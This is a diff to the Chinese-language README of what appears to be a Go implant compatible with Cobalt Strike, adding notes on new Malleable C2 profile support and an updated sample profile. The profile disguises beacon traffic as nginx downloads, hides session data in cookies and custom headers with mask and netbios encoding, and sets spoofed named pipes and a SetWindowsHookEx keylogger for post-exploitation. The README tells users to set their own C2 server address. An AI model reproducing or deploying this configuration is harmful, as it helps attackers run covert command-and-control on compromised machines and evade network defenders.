@@ -42,6 +42,7 @@
 目前项目有部分控制台输出内容，若想删除可在代码中删除。
 
 **最简单的使用方法即为修改config.go中的公钥以及C2服务器地址，然后C2profile更换为下面的示例即可。**
+**C2profile示例已更新，C2profile适配的相关代码已更新，请师傅们重新下载一下**
 
 ## 实现功能
 ### windows平台支持的功能：
@@ -53,8 +54,17 @@ sleep、shell、upload、download、exit、cd、pwd、file_browse、ps、kill、
 文件管理部分支持图形化交互
 
 ### C2profile：
+10.31新增功能：
+
+1、适配了metadata的header、parameter、uri-append形式，暂时不支持print，不过要注意**prepend与parameter同时存在的时候好像会解析不了**，请避免同时使用。
+
+2、适配了http-post的id的prepend、append以及parameter、header形式。
+
+3、适配了http-post的output的parameter、header、print形式，暂时不支持uri-append形式。
+
 适配了C2profile流量侧的设置与部分主机侧的设置，支持的算法有base64、base64url、mask、netbios、netbiosu、详情见config.go，这里给出示例C2profile，修改完C2profile后请不要忘记在config.go中对相应位置进行修改：
 ```
+# default sleep time is 60s
 set sleeptime "3000";
 
 https-certificate {
@@ -66,11 +76,14 @@ https-certificate {
     set validity "365";
 }
 
+# define indicators for an HTTP GET
 http-get {
 
 	set uri "/www/handle/doc";
 
 	client {
+		#header "Host" "aliyun.com";
+		# base64 encode session metadata and store it in the Cookie header.
 		metadata {
 			base64url;
 			prepend "SESSIONID=";
@@ -79,6 +92,8 @@ http-get {
 	}
 
 	server {
+		# server should send output with no changes
+		#header "Content-Type" "application/octet-stream";
 		header "Server" "nginx/1.10.3 (Ubuntu)";
     		header "Content-Type" "application/octet-stream";
         	header "Connection" "keep-alive";
@@ -97,16 +112,24 @@ http-get {
 	}
 }
 
+# define indicators for an HTTP 
 http-post {
+	# Same as above, Beacon will randomly choose from this pool of URIs [if multiple URIs are provided]
 	set uri "/IMXo";
 	client {
+		#header "Content-Type" "application/octet-stream";				
+
+		# transmit our session identifier as /submit.php?id=[identifier]
 		
 		id {				
 			mask;
 			netbiosu;
-			parameter "doc";
+			prepend "user=";
+			append "%%";
+			header "User";
 		}
 
+		# post our output with no real changes
 		output {
 			mask;
 			base64url;
@@ -116,6 +139,7 @@ http-post {
 		}
 	}
 
+	# The server's response to our HTTP POST
 	server {
 		header "Server" "nginx/1.10.3 (Ubuntu)";
     		header "Content-Type" "application/octet-stream";
@@ -124,7 +148,8 @@ http-post {
         	header "Pragma" "public";
         	header "Expires" "0";
         	header "Cache-Control" "must-revalidate, post-check=0, pre-check=0";
-          
+
+		# this will just print an empty string, meh...
 		output {
 			mask;
 			netbios;
@@ -143,6 +168,7 @@ post-ex {
     set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
     set keylogger "SetWindowsHookEx";
 }
+
 ```
 
 ### 目前需要改进的地方：
